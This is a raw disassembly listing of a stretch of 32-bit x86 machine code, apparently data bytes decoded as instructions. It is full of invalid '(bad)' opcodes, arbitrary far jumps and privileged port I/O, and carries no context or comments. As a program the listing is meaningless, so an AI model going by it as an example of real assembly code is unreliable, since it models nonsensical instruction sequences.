  41e682:	imul   esi,DWORD PTR [edx-0x38],0x22
  41e686:	or     BYTE PTR [eax+0x51],dh
  41e689:	cwde   
  41e68a:	pop    ebp
  41e68b:	jle    0x41e6dc
  41e68d:	mov    ds:0xdce2f6d6,eax
  41e692:	or     cl,BYTE PTR [edx]
  41e694:	sbb    DWORD PTR [edi-0x396f647b],esp
  41e69a:	rol    BYTE PTR ds:0xc3248272,cl
  41e6a0:	and    edx,DWORD PTR [edi+0x237a7286]
  41e6a6:	push   DWORD PTR [ecx]
  41e6a8:	jb     0x41e65e
  41e6aa:	loop   0x41e6d4
  41e6ac:	repz aad 0x6e
  41e6af:	xor    eax,0xfe5756dd
  41e6b5:	jns    0x41e6ff
  41e6b7:	popa   
  41e6b8:	mov    esp,0x4eb42a01
  41e6bd:	(bad)  
  41e6be:	push   esp
  41e6bf:	in     eax,dx
  41e6c0:	jne    0x41e6ce
  41e6c2:	dec    ebx
  41e6c3:	ins    BYTE PTR es:[edi],dx
  41e6c4:	popa   
  41e6c5:	(bad)
  41e6c9:	fcmovu st,st(3)
  41e6cb:	push   ecx
  41e6cd:	inc    edi
  41e6cf:	and    edi,edx
  41e6d1:	shl    BYTE PTR [ecx+0x35],0x7c
  41e6d5:	ficom  DWORD PTR [ebp+edx*2+0x7f]
  41e6d9:	sub    al,0xec
  41e6db:	out    dx,al
  41e6dc:	cli    
  41e6dd:	sbb    ah,dh
  41e6df:	shr    esi,0xf1
  41e6e2:	in     eax,dx
  41e6e3:	cmp    al,0x95
  41e6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e6:	ins    DWORD PTR es:[edi],dx
  41e6e7:	adc    edx,ebp
  41e6e9:	add    DWORD PTR [esi+0x66a36fd7],esi
  41e6ef:	dec    esp
  41e6f0:	add    eax,0x64d77d62
  41e6f5:	call   0x7f37:0x6cd5e965
  41e6fc:	lock in al,dx
  41e6fe:	dec    ebx
  41e6ff:	push   ebp
  41e700:	les    ebx,FWORD PTR [edi]
  41e702:	push   es
  41e703:	xchg   esp,eax
  41e704:	mov    DWORD PTR [ecx+0x36],edx
  41e707:	stos   BYTE PTR es:[edi],al
  41e708:	jbe    0x41e6b8
  41e70a:	stos   BYTE PTR es:[edi],al
  41e70b:	test   al,0x74
  41e70d:	add    cl,BYTE PTR ds:0x4acbcf27
  41e713:	cmp    edi,DWORD PTR [esi-0xa]
  41e716:	cmp    BYTE PTR [eax+0x561535c2],dh
  41e71c:	arpl   WORD PTR [ebx-0x1205e402],dx
  41e722:	std    
  41e723:	mov    ebx,ebx
  41e725:	jmp    0x19fd:0xca915ce3
  41e72c:	mov    esi,0x68012b65
  41e731:	mov    esi,0x357a86ab
  41e736:	sbb    edi,DWORD PTR [eax-0x38]
  41e739:	mov    esp,0xddbc7489
  41e73e:	enter  0x392,0xc5
  41e742:	push   ebp
  41e743:	jne    0x41e6d1
  41e745:	push   eax
  41e746:	sub    eax,edi
  41e748:	fwait
  41e749:	sbb    edx,DWORD PTR [ecx]
  41e74b:	pusha  
  41e74c:	xor    al,0x2d
  41e74e:	ds cs pop eax
  41e751:	mov    ds:0x82024266,eax
  41e756:	sti    
  41e757:	outs   dx,DWORD PTR ds:[esi]
  41e758:	cmp    ch,BYTE PTR [eax+edx*4+0x22ddb5f5]
  41e75f:	stc    
  41e760:	ins    BYTE PTR es:[edi],dx
  41e761:	cmp    esp,DWORD PTR [edx+0x150f28e7]
  41e767:	(bad)  
  41e768:	iret   
  41e769:	inc    ebp
  41e76a:	sbb    al,BYTE PTR [eax+0x49]
  41e76d:	dec    DWORD PTR [ecx-0x5c]
  41e770:	ficomp WORD PTR [ebx]
  41e772:	push   ebx
  41e773:	cmp    edi,edx
  41e775:	cmc    
  41e776:	adc    BYTE PTR [eax+ebx*1+0x1b],ah
  41e77a:	push   ecx
  41e77b:	mov    dl,0x3d
  41e77d:	sub    BYTE PTR [esi+0x2b],ah
  41e780:	add    dh,ah
  41e782:	div    DWORD PTR [ebx+eiz*4]
  41e785:	sub    edi,DWORD PTR [esi+edx*1+0x19518baf]
  41e78c:	pop    ebp
  41e78d:	ja     0x41e793
  41e78f:	mov    ecx,0x6a3dafed
  41e794:	xor    DWORD PTR [ebx-0x6d00ea56],edx
  41e79a:	cmp    eax,0x33279162
  41e79f:	add    esi,edx
  41e7a1:	dec    ecx
  41e7a2:	cld    
  41e7a3:	xchg   DWORD PTR [ecx-0x62f71d1],esi
  41e7a9:	inc    ecx
  41e7aa:	call   0x5242d91a
  41e7af:	sub    ebx,ecx
  41e7b1:	xor    esi,ecx
  41e7b3:	xor    al,0x56
  41e7b5:	xor    ebx,DWORD PTR [esi-0x5e]
  41e7b8:	and    al,0x16
  41e7ba:	push   0x5e0127db
  41e7bf:	jo     0x41e81f
  41e7c1:	call   0xa455:0x8c89ae8e
  41e7c8:	pusha  
  41e7c9:	sar    DWORD PTR [esi-0x68],cl
  41e7cc:	ins    BYTE PTR es:[edi],dx
  41e7cd:	sub    edx,eax
  41e7cf:	sbb    esp,DWORD PTR fs:[esi-0x72]
  41e7d3:	xor    al,0xc5
  41e7d5:	xchg   esi,eax
  41e7d6:	jae    0x41e780
  41e7d8:	out    dx,al
  41e7d9:	sub    eax,0x13a1fc11
  41e7de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7df:	fcomp  QWORD PTR [esi-0xce98ccc]
  41e7e5:	mov    edx,0xf3104674
  41e7ea:	lock div DWORD PTR [edx+0x50d158dd]
  41e7f1:	aaa    
  41e7f2:	sub    eax,0xdab855da
  41e7f7:	jle    0x41e861
  41e7f9:	das    
  41e7fa:	inc    esi
  41e7fb:	mov    esi,0x3c320e7b
  41e800:	jmp    0x8046:0xe6163e04
  41e807:	mov    ds:0x871adf79,eax
  41e80c:	sub    BYTE PTR [edx+0x55],0x6
  41e810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e811:	xor    DWORD PTR [edi-0x687c3470],ebx
  41e817:	rcr    DWORD PTR [edx],1
  41e819:	mov    dl,0xb3
  41e81b:	jo     0x41e858
  41e81d:	sbb    BYTE PTR [ecx],bl
  41e81f:	pop    eax
  41e820:	inc    ebx
  41e821:	adc    BYTE PTR [esi+0x78],ch
  41e824:	retf   
  41e825:	adc    DWORD PTR [eax-0x50],esp
  41e828:	xchg   ebp,eax
  41e829:	js     0x41e8a8
  41e82b:	or     edx,DWORD PTR [edx]
  41e82d:	lods   al,BYTE PTR ds:[esi]
  41e82e:	mov    edx,0x2fca3ae9
  41e833:	jp     0x41e7d5
  41e835:	jmp    0x4a60:0xba870614
  41e83c:	xor    al,0xb1
  41e83e:	jge    0x41e80c
  41e840:	push   ebp
  41e841:	push   0xc7418104
  41e846:	aaa    
  41e847:	push   ebx
  41e848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e849:	aam    0x5a
  41e84b:	std    
  41e84c:	push   ds
  41e84d:	or     dl,BYTE PTR [esi-0x1185617c]
  41e853:	fsub   QWORD PTR [ebx+0x75]
  41e856:	pop    eax
  41e857:	xchg   ebp,eax
  41e858:	and    ch,al
  41e85a:	sbb    ebp,0xffffff8c
  41e85d:	jne    0x41e810
  41e85f:	jg     0x41e8b7
  41e861:	fidivr WORD PTR [esi-0x7070c0a5]
  41e867:	cmp    DWORD PTR [ebx+0x61],0x843efe3f
  41e86e:	sub    eax,0x8d141a17
  41e873:	cmp    eax,0xcbbc9825
  41e878:	rcl    ah,1
  41e87a:	iret   
  41e87b:	add    esi,DWORD PTR [ecx]
  41e87d:	sbb    al,0xfe
  41e87f:	data16 add al,0x70
  41e882:	mov    al,ds:0x4dcb8c21
  41e887:	leave  
  41e888:	jmp    0x41e86c
  41e88a:	mov    ebp,DWORD PTR [ebx+0x35cd0dcd]
  41e890:	call   DWORD PTR [esi-0x671d6aea]
  41e896:	not    BYTE PTR [edx+0x388494ad]
  41e89c:	xor    al,0xc7
  41e89e:	jl     0x41e90e
  41e8a0:	pop    ebx
  41e8a1:	sub    eax,0x9c1957e1
  41e8a6:	not    BYTE PTR [ecx]
  41e8a8:	mov    eax,0xda21816e
  41e8ad:	shrd   DWORD PTR [edi-0x34],edx,cl
  41e8b1:	iret   
  41e8b2:	retf   0x8efe
  41e8b5:	call   0x1b83c58d
  41e8ba:	jmp    0x41e83f
  41e8bc:	lods   al,BYTE PTR ds:[esi]
  41e8bd:	pop    edx
  41e8be:	hlt    
  41e8bf:	aad    0xf5
  41e8c1:	jmp    0x83fd784e
  41e8c6:	pop    es
  41e8c7:	push   0xc104ba36
  41e8cc:	out    0x97,al
  41e8ce:	fs mov esi,0x4b7c779c
  41e8d4:	shl    BYTE PTR [ebx+0x2a],0xcb
  41e8d8:	xchg   ecx,eax
  41e8d9:	imul   esi,DWORD PTR [eax+eax*8],0x2763c907
  41e8e0:	sub    DWORD PTR [edi],ebx
  41e8e2:	pop    edi
  41e8e3:	adc    al,0x8a
  41e8e5:	or     cl,BYTE PTR [edi+0x2296b9d7]
  41e8eb:	inc    ebp
  41e8ec:	add    eax,eax
  41e8ee:	push   0xfffffff0
  41e8f0:	push   esp
  41e8f1:	fcmovbe st,st(5)
  41e8f3:	inc    ecx
  41e8f4:	add    ecx,eax
  41e8f6:	mov    BYTE PTR [esi],dl
  41e8f8:	popf   
  41e8f9:	inc    edx
  41e8fa:	push   esp
  41e8fb:	es xchg ecx,eax
  41e8fd:	jno    0x41e948
  41e8ff:	or     bl,BYTE PTR [ecx+esi*8-0x6c]
  41e903:	lods   al,BYTE PTR ds:[esi]
  41e904:	inc    edi
  41e905:	pop    ebx
  41e906:	cli    
  41e907:	and    eax,0x7d999430
  41e90c:	and    al,0xc7
  41e90e:	aaa    
  41e90f:	les    ebp,FWORD PTR [ecx-0x35]
  41e912:	aas    
  41e913:	xchg   ecx,eax
  41e914:	jecxz  0x41e92c
  41e916:	mov    dh,0x33
  41e918:	outs   dx,DWORD PTR ds:[esi]
  41e919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e91a:	sbb    BYTE PTR [eax+esi*1],0xd9
  41e91e:	adc    al,0xab
  41e920:	xchg   ebx,eax
  41e921:	(bad)  
  41e922:	in     al,dx
  41e923:	js     0x41e8b2
  41e925:	or     al,0x9f
  41e927:	jle    0x41e8e9
  41e929:	adc    ebp,DWORD PTR [esi]
  41e92b:	inc    ebx
  41e92c:	adc    al,0xab
  41e92e:	scas   al,BYTE PTR es:[edi]
  41e92f:	mov    DWORD PTR [ebx+eax*8+0xf1bcc46],ecx
  41e936:	inc    edx
  41e937:	push   ds
  41e938:	jns    0x41e8f6
  41e93a:	pop    ss
  41e93b:	aam    0x82
  41e93d:	xor    bh,BYTE PTR [edx-0x37f3f609]
  41e943:	mov    WORD PTR [edx+0x59],ds
  41e946:	sub    al,0xe4
  41e948:	pop    ds
  41e949:	sbb    ecx,DWORD PTR [edi]
  41e94b:	out    dx,eax
  41e94c:	call   0x1f50e171
  41e951:	jno    0x41e91f
  41e953:	out    0x53,al
  41e955:	inc    ebx
  41e956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e957:	or     BYTE PTR [esi+0x2c],al
  41e95a:	xor    al,0xf0
  41e95c:	jae    0x41e952
  41e95e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e95f:	mov    eax,ds:0x58091f87
  41e964:	cmp    eax,0xa49016a4
  41e969:	sbb    ecx,eax
  41e96b:	cli    
  41e96c:	jge    0x41e96d
  41e96e:	gs mov ch,0x24
  41e971:	xchg   ebp,eax
  41e972:	lods   eax,DWORD PTR ds:[esi]
  41e973:	or     ebp,DWORD PTR ds:0xab510ee1
  41e97a:	mov    ds:0x659ac47,eax
  41e97f:	jb     0x41e987
  41e981:	xor    ecx,edi
  41e983:	ins    DWORD PTR es:[edi],dx
  41e984:	dec    ebx
  41e985:	adc    ecx,DWORD PTR [edx-0x4117fa5d]
  41e98b:	xchg   ebx,eax
  41e98c:	outs   dx,BYTE PTR ds:[esi]
  41e98d:	sbb    eax,DWORD PTR [edi+edi*2]
  41e990:	xchg   BYTE PTR [edx+0x34],ch
  41e993:	sbb    ebp,esp
  41e995:	shr    BYTE PTR [eax+0x69],1
  41e998:	mov    eax,0x2d5f9bc7
  41e99d:	imul   esi,ebp,0xdb5857fb
  41e9a3:	and    eax,0xd1f76168
  41e9a8:	gs dec eax
  41e9aa:	(bad)  
  41e9ab:	mov    ecx,0x1ee6a1e0
  41e9b0:	cwde   
  41e9b1:	mov    cl,0xd5
  41e9b3:	or     DWORD PTR [ebx-0x7495a9f5],0x26b1c42
  41e9bd:	out    dx,eax
  41e9be:	mov    dh,0xc0
  41e9c0:	push   0x8742cdbe
  41e9c5:	jbe    0x41e961
  41e9c7:	icebp  
  41e9c8:	mov    dl,0x44
  41e9ca:	movaps xmm0,XMMWORD PTR [edx]
  41e9cd:	(bad)  
  41e9ce:	cmp    esi,DWORD PTR [edi+ebp*4]
  41e9d1:	or     esp,DWORD PTR [edi]
  41e9d3:	es dec esp
  41e9d5:	pop    ds
  41e9d6:	fld    DWORD PTR [eax+0x1b]
  41e9d9:	pop    esp
  41e9da:	dec    edi
  41e9db:	arpl   WORD PTR [eax+edi*4-0x67],ax
  41e9df:	retf   0x8cd0
  41e9e2:	jne    0x41ea35
  41e9e4:	mov    eax,0xec9bd2ca
  41e9e9:	inc    ebp
  41e9ea:	aad    0xd5
  41e9ec:	ds add al,0xcd
  41e9ef:	mov    eax,0x880473ce
  41e9f4:	mov    bl,0x49
  41e9f6:	or     edi,DWORD PTR [ebx]
  41e9f8:	or     esi,0xffffffbb
  41e9fb:	fdivr  QWORD PTR [ecx+ecx*4+0x2310d597]
  41ea02:	inc    ebx
  41ea03:	xchg   ebx,eax
  41ea04:	mov    ebp,0x210b0a01
  41ea09:	and    al,0xae
  41ea0b:	sbb    DWORD PTR [eax],eax
  41ea0d:	sbb    al,BYTE PTR [eax+ebp*2]
  41ea10:	(bad)  
  41ea11:	sbb    al,al
  41ea13:	pop    ds
  41ea14:	(bad)  
  41ea15:	je     0x41e9dc
  41ea17:	into   
  41ea18:	sub    ecx,ecx
  41ea1a:	pop    ds
  41ea1b:	mov    ch,BYTE PTR [ecx+0x6d]
  41ea1e:	iret   
  41ea1f:	inc    DWORD PTR [ebp+0x3af1e1c0]
  41ea25:	aas    
  41ea26:	adc    al,0x22
  41ea28:	push   ss
  41ea29:	and    BYTE PTR ds:0xb44a1015,bh
  41ea2f:	mov    ds:0xa0ce58b3,al
  41ea34:	cmp    DWORD PTR [ebp-0x2842703f],edi
  41ea3a:	sub    ah,ah
  41ea3c:	sti    
  41ea3d:	jp     0x41ea40
  41ea3f:	xchg   edi,eax
  41ea40:	sub    BYTE PTR [eax+eax*1+0x225e3d4b],cl
  41ea47:	or     eax,DWORD PTR [edi]
  41ea49:	jmp    DWORD PTR [ecx+0x54]
  41ea4c:	iret   
  41ea4d:	ss dec ebp
  41ea4f:	jg     0x41ea17
  41ea51:	adc    eax,0xe1fbcdbe
  41ea56:	test   DWORD PTR [esi],edi
  41ea58:	(bad)  
  41ea59:	out    0xef,eax
  41ea5b:	xor    edi,DWORD PTR [eax-0x59220e40]
  41ea61:	retf   
  41ea62:	xor    ebp,edi
  41ea64:	retf   
  41ea65:	push   ebp
  41ea66:	pusha  
  41ea67:	cmp    edx,esi
  41ea69:	mov    edx,0x2f6b98ac
  41ea6e:	sbb    esp,DWORD PTR [edi+0x1628302b]
  41ea74:	call   0xde7d5b41
  41ea79:	out    0x5a,eax
  41ea7b:	and    al,0xa2
  41ea7d:	or     dl,BYTE PTR ds:0x11a971a3
  41ea83:	pushf  
  41ea84:	jo     0x41ea9a
  41ea86:	loop   0x41eacb
  41ea88:	sub    cl,dl
  41ea8a:	arpl   si,cx
  41ea8c:	inc    edx
  41ea8d:	enter  0xb407,0x19
  41ea91:	loop   0x41eaa8
  41ea93:	mov    eax,0xe27b3b1e
  41ea98:	push   ecx
  41ea99:	xchg   esp,eax
  41ea9a:	fimul  WORD PTR [esp+eiz*2]
  41ea9d:	mov    esp,0x8a25f3b4
  41eaa2:	cmp    ebp,esi
  41eaa4:	imul   BYTE PTR [esi-0x12eda83d]
  41eaaa:	xchg   ebp,eax
  41eaab:	xor    ecx,DWORD PTR es:[edi-0x7845c31a]
  41eab2:	jb     0x41ea52
  41eab4:	sub    BYTE PTR [edi-0x22],0x23
  41eab8:	push   edx
  41eab9:	push   ss
  41eaba:	and    eax,0xd0a5e08
  41eabf:	dec    esi
  41eac0:	xchg   DWORD PTR [ebp-0x188e30ae],ebp
  41eac6:	loopne 0x41eac0
  41eac8:	jne    0x41eb3f
  41eaca:	mov    ebx,0x514fd42e
  41eacf:	leave  
  41ead0:	icebp  
  41ead1:	aad    0x10
  41ead3:	cli    
  41ead4:	xchg   esi,eax
  41ead5:	sbb    ch,dl
  41ead7:	pop    ss
  41ead8:	in     al,0xe6
  41eada:	xor    BYTE PTR cs:0x15955721,dh
  41eae1:	sub    bh,ch
  41eae3:	or     bh,dh
  41eae5:	xchg   esp,eax
  41eae6:	add    BYTE PTR [ebx+eax*8+0xe],bh
  41eaea:	push   edx
  41eaeb:	xchg   ebx,eax
  41eaec:	retf   
  41eaed:	ret    0x4574
  41eaf0:	jmp    0x41ea98
  41eaf2:	sub    DWORD PTR [eax+esi*8],ebx
  41eaf5:	aad    0xbf
  41eaf7:	ja     0x41eb14
  41eaf9:	and    BYTE PTR [ebp-0x678a5f51],bl
  41eaff:	shr    DWORD PTR [ebx+edx*1],1
  41eb02:	or     bl,BYTE PTR [ecx+edx*2-0x38f8b73f]
  41eb09:	sub    al,0x5c
  41eb0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb0c:	ja     0x41eac5
  41eb0e:	in     al,dx
  41eb0f:	jle    0x41eb8a
  41eb11:	rep lods eax,DWORD PTR ds:[esi]
  41eb13:	jno    0x41eb49
  41eb15:	jecxz  0x41eb63
  41eb17:	les    ecx,FWORD PTR [bp+si-0x3d]
  41eb1b:	(bad)  
  41eb1c:	(bad)  
  41eb1d:	mov    bl,0x61
  41eb1f:	cmp    eax,edx
  41eb21:	fcomp  QWORD PTR [esi]
  41eb23:	push   esp
  41eb24:	addr16 add eax,0x2b5d2672
  41eb2a:	add    al,0xfc
  41eb2c:	xchg   edx,eax
  41eb2d:	bound  edx,QWORD PTR [ebx+0x3e]
  41eb30:	pop    ebp
  41eb31:	pushf  
  41eb32:	and    esi,DWORD PTR [edi]
  41eb34:	sub    eax,0xaf6b8272
  41eb39:	add    ebp,DWORD PTR [edx+0x59]
  41eb3c:	jmp    0xeb0bf514
  41eb41:	and    BYTE PTR [ecx],ch
  41eb43:	cmp    esp,edx
  41eb45:	enter  0x88ab,0xdb
  41eb49:	neg    DWORD PTR [edi-0x26]
  41eb4c:	imul   edx,ecx,0x44601ff6
  41eb52:	xchg   ebp,eax
  41eb53:	mov    ds:0xd64d4f4f,al
  41eb58:	ja     0x41eb5c
  41eb5a:	mov    ds:0x8bee4098,eax
  41eb5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb61:	mov    edx,0x4cb20404
  41eb66:	pop    ebx
  41eb67:	leave  
  41eb68:	popa   
  41eb69:	dec    esp
  41eb6a:	sti    
  41eb6b:	jae    0x41eb66
  41eb6d:	sbb    BYTE PTR [edx+ecx*4-0x75],cl
  41eb71:	scas   eax,DWORD PTR es:[edi]
  41eb72:	cmp    bh,BYTE PTR ds:0x4810dee7
  41eb78:	xchg   ebp,eax
  41eb79:	(bad)  
  41eb7b:	cs dec edi
  41eb7d:	push   esi
  41eb7e:	into   
  41eb7f:	test   DWORD PTR [edx],esp
  41eb81:	sub    DWORD PTR [edi],esp
  41eb83:	rcr    DWORD PTR [ebp-0x5c05c8fa],1
  41eb89:	jne    0x41eb95
  41eb8b:	mov    eax,ds:0x4785b8c
  41eb90:	lea    ebx,[eax+0x6d918103]
  41eb96:	xchg   DWORD PTR [edi+0x2fa773e5],ebp
  41eb9c:	cmp    al,0xb4
  41eb9e:	xchg   edx,eax
  41eb9f:	inc    esi
  41eba0:	add    al,bh
  41eba2:	mov    eax,ds:0x3b33e390
  41eba7:	add    DWORD PTR [edi-0x1b1c15dd],edi
  41ebad:	lods   al,BYTE PTR ds:[esi]
  41ebae:	es aaa 
  41ebb0:	sbb    BYTE PTR [edi-0x75a27046],dh
  41ebb6:	jecxz  0x41ebc5
  41ebb8:	es pop eax
  41ebba:	or     BYTE PTR [esi+0x786fbd4d],0xd4
  41ebc1:	xchg   esp,eax
  41ebc3:	pop    ebx
  41ebc4:	in     eax,0xe3
  41ebc6:	stc    
  41ebc7:	cmp    ebp,DWORD PTR [ebx+0x65ce5ee0]
  41ebcd:	inc    ebx
  41ebce:	adc    DWORD PTR [ebx],edx
  41ebd0:	mov    eax,ecx
  41ebd2:	fcom   DWORD PTR [ecx+0x3248720a]
  41ebd8:	cwde   
  41ebd9:	in     eax,dx
  41ebda:	jl     0x41ebcf
  41ebdc:	and    al,0x33
  41ebde:	jnp    0x41ebcf
  41ebe0:	outs   dx,DWORD PTR ds:[esi]
  41ebe1:	cwde   
  41ebe2:	mov    edi,0xab94196
  41ebe7:	fcomp  QWORD PTR [ebp+0x33]
  41ebea:	dec    edx
  41ebeb:	lods   al,BYTE PTR ds:[esi]
  41ebec:	je     0x41ebf2
  41ebee:	idiv   BYTE PTR [ebp-0x53]
  41ebf1:	bndstx [ecx+0x596aaeb2],(bad)
  41ebf8:	popf   
  41ebf9:	inc    esp
  41ebfa:	mov    ebx,0xcd10452e
  41ebff:	adc    edx,DWORD PTR [ebp+0x3d]
  41ec02:	or     DWORD PTR [edx],0x18
  41ec05:	xchg   ebx,eax
  41ec06:	rcr    DWORD PTR [ebx],0x6c
  41ec09:	adc    eax,0x2bf15a31
  41ec0e:	stos   DWORD PTR es:[edi],eax
  41ec0f:	mov    bh,0x68
  41ec11:	pop    ecx
  41ec12:	or     DWORD PTR [eax+0x421e32d4],edi
  41ec18:	sbb    esi,DWORD PTR [eax-0x205457dd]
  41ec1e:	sbb    eax,0x76696160
  41ec23:	push   ebx
  41ec25:	push   ecx
  41ec26:	dec    eax
  41ec27:	push   eax
  41ec28:	xor    BYTE PTR [ecx+0x27],al
  41ec2b:	sub    DWORD PTR [edx+0x372f1008],ebp
  41ec31:	xchg   ecx,eax
  41ec32:	mov    ebp,0x19dac673
  41ec37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec38:	mov    ch,ah
  41ec3a:	xor    DWORD PTR [ebx+0x391a21b5],ebx
  41ec40:	jg     0x41ebe3
  41ec42:	rcr    ebp,cl
  41ec44:	push   edi
  41ec45:	nop
  41ec46:	pop    esi
  41ec47:	icebp  
  41ec48:	xchg   edx,eax
  41ec49:	adc    edx,edi
  41ec4b:	add    al,0xca
  41ec4d:	mov    WORD PTR [eax-0xd],cs
  41ec50:	jmp    0xc48f:0xa921d508
  41ec57:	cdq    
  41ec58:	mov    ebp,0x81db6670
  41ec5d:	js     0x41ec9f
  41ec5f:	div    ebx
  41ec61:	test   al,0xfc
  41ec63:	sbb    DWORD PTR [ebx],edi
  41ec65:	jp     0x41ecca
  41ec67:	push   0x2cba7107
  41ec6c:	addr16 sbb al,0xa2
  41ec6f:	pop    sp
  41ec71:	mov    edx,0xff365924
  41ec76:	mov    ah,0x4d
  41ec78:	sbb    al,0xf
  41ec7a:	pop    edx
  41ec7b:	lods   al,BYTE PTR ds:[esi]
  41ec7c:	aas    
  41ec7d:	retf   
  41ec7e:	cmc    
  41ec7f:	out    dx,al
  41ec80:	add    BYTE PTR [edi],dh
  41ec82:	inc    eax
  41ec83:	fidiv  WORD PTR [eax+eax*8+0x5289d7ff]
  41ec8a:	out    0x13,eax
  41ec8c:	mov    ch,cl
  41ec8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec8f:	adc    al,BYTE PTR [ecx+0x35]
  41ec92:	push   esp
  41ec93:	sbb    eax,0xb18b56aa
  41ec98:	ror    dl,1
  41ec9a:	cmp    DWORD PTR [esi],edx
  41ec9c:	xchg   edi,eax
  41ec9d:	push   edx
  41ec9e:	sbb    cl,al
  41eca0:	jl     0x41ec44
  41eca2:	stc    
  41eca3:	and    al,BYTE PTR [ecx-0x2a]
  41eca6:	add    dh,BYTE PTR [edx+esi*8]
  41eca9:	mov    dh,bh
  41ecab:	sbb    ah,BYTE PTR [ebx]
  41ecad:	imul   edx,DWORD PTR [eax],0x3ff6b0ec
  41ecb3:	imul   ecx,esp,0x4f
  41ecb6:	lds    ebp,FWORD PTR [ebx-0x65]
  41ecb9:	in     al,0x27
  41ecbb:	adc    dl,BYTE PTR [eax]
  41ecbd:	das    
  41ecbe:	add    BYTE PTR [edi+0x6654dc4c],0x24
  41ecc5:	pop    esi
  41ecc6:	call   0x755dc341
  41eccb:	sar    BYTE PTR [ecx-0x5546cffb],0xd0
  41ecd2:	pop    eax
  41ecd3:	popf   
  41ecd4:	push   edx
  41ecd5:	xchg   ebx,eax
  41ecd6:	push   eax
  41ecd7:	aas    
  41ecd8:	call   0xd2a5:0x103ae46c
  41ecdf:	ins    DWORD PTR es:[edi],dx
  41ece0:	xchg   ebp,eax
  41ece1:	jp     0x41ecf1
  41ece3:	xor    BYTE PTR [ebp*8+0x43830614],0x93
  41eceb:	enter  0xc555,0xfa
  41ecef:	dec    edi
  41ecf0:	out    dx,al
  41ecf1:	daa    
  41ecf2:	sbb    BYTE PTR [eax],al
  41ecf4:	cdq    
  41ecf5:	lea    ebx,[edi+eax*4]
  41ecf8:	fwait
  41ecf9:	dec    eax
  41ecfa:	call   0x264b:0xfb41b2a0
  41ed01:	mov    bh,0xc7
  41ed03:	aas    
  41ed04:	fdiv   DWORD PTR [edi]
  41ed06:	pop    edx
  41ed07:	push   eax
  41ed08:	mov    ds:0x49f1497f,al
  41ed0d:	or     DWORD PTR [ebx+0x19bdf8c],ecx
  41ed13:	sbb    eax,0x8f033784
  41ed18:	popa   
  41ed19:	pop    es
  41ed1a:	mov    ds:0x6f73aa4c,al
  41ed1f:	sub    eax,0x94094937
  41ed24:	add    BYTE PTR [edi+0x1f4495e4],dl
  41ed2a:	dec    edi
  41ed2b:	enter  0xe860,0x2d
  41ed2f:	push   edi
  41ed30:	inc    edx
  41ed31:	addr16 ja 0x41ed2a
  41ed34:	sbb    al,0x95
  41ed36:	jns    0x41ed34
  41ed38:	and    dh,BYTE PTR [ebp+0x10]
  41ed3b:	or     cl,BYTE PTR [ecx]
  41ed3d:	mov    esp,0x38943a2f
  41ed42:	popa   
  41ed43:	dec    esp
  41ed44:	adc    edx,DWORD PTR [esi+0x3b596c1a]
  41ed4a:	scas   al,BYTE PTR es:[edi]
  41ed4b:	loope  0x41ecee
  41ed4d:	stc    
  41ed4e:	call   0xb6cd9d68
  41ed53:	and    al,ah
  41ed55:	push   ss
  41ed56:	pushf  
  41ed57:	in     eax,dx
  41ed58:	js     0x41ed96
  41ed5a:	rcl    dh,1
  41ed5c:	cwde   
  41ed5d:	(bad)  
  41ed5e:	loop   0x41edb9
  41ed60:	fcmovnu st,st(1)
  41ed62:	pop    es
  41ed63:	stos   DWORD PTR es:[edi],eax
  41ed64:	push   es
  41ed65:	jae    0x41ecfe
  41ed67:	adc    esi,ebx
  41ed69:	pop    esp
  41ed6a:	repz das 
  41ed6c:	mov    fs,WORD PTR ds:[edi+ecx*2+0x51]
  41ed71:	je     0x41ed46
  41ed73:	pop    edi
  41ed74:	shr    BYTE PTR [ebx+edx*2-0x5d1c8368],1
  41ed7b:	jo     0x41ed99
  41ed7d:	pop    edx
  41ed7e:	(bad)
  41ed82:	outs   dx,BYTE PTR ds:[esi]
  41ed84:	cwde   
  41ed85:	shr    DWORD PTR [esi],0xd2
  41ed88:	rcl    BYTE PTR [edi+0x427d4131],0x22
  41ed8f:	mov    ebp,0x7888c494
  41ed94:	xchg   ecx,eax
  41ed95:	sahf   
  41ed96:	hlt    
  41ed97:	stc    
  41ed98:	jne    0x41edf2
  41ed9a:	les    ecx,FWORD PTR [edi-0x3a]
  41ed9d:	jge    0x41ee02
  41ed9f:	outs   dx,BYTE PTR ds:[esi]
  41eda0:	xor    eax,0x64cd958b
  41eda5:	mov    eax,0x617163f0
  41edaa:	cmc    
  41edab:	inc    ebx
  41edac:	jl     0x41ed42
  41edae:	xor    ecx,DWORD PTR [ecx-0x5cac6b46]
  41edb4:	inc    ebx
  41edb5:	sub    eax,0x451c3a06
  41edba:	sbb    eax,0x7e2b328c
  41edbf:	mov    ebp,0x49d85824
  41edc4:	inc    esp
  41edc5:	push   cs
  41edc6:	mov    ebx,0x478cfda5
  41edcb:	(bad)
  41edce:	and    bl,BYTE PTR [ebp-0x61]
  41edd1:	xchg   esp,eax
  41edd2:	mov    esp,0x3bc4a78d
  41edd7:	adc    DWORD PTR [edi],edi
  41edd9:	mov    edx,0x22e81120
  41edde:	pop    ecx
  41eddf:	jb     0x41ed63
  41ede1:	and    eax,DWORD PTR [esi+0x2acc1a38]
  41ede7:	xor    eax,0x3747b07e
  41edec:	push   es
  41eded:	adc    al,0xe1
  41edef:	inc    edx
  41edf0:	loopne 0x41ee12
  41edf2:	dec    edx
  41edf3:	dec    edx
  41edf4:	xor    DWORD PTR [esi+eiz*1+0x46],esi
  41edf8:	dec    ecx
  41edf9:	jns    0x41edf5
  41edfb:	into   
  41edfc:	mov    bl,0xbf
  41edfe:	cld    
  41edff:	ret    
  41ee00:	fcmovnu st,st(5)
  41ee02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee03:	sbb    eax,0x9f5e7477
  41ee08:	cld    
